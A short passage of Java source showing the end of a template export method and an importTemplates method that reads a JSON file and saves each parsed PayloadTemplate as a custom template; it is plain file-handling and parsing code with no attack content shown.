        } catch (Exception e) {
            System.err.println("Failed to export templates: " + e.getMessage());
        }
    }
    
    public void importTemplates(String filePath) {
        try {
            String content = new String(Files.readAllBytes(Paths.get(filePath)), StandardCharsets.UTF_8);
            JSONObject importData = new JSONObject(content);
            
            JSONArray array = importData.optJSONArray("templates");
            if (array != null) {
                for (int i = 0; i < array.length(); i++) {
                    JSONObject json = array.getJSONObject(i);
                    PayloadTemplate template = PayloadTemplate.fromJson(json);
                    if (template != null) {
                        saveCustomTemplate(template);
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("Failed to import templates: " + e.getMessage());
        }
    }
}
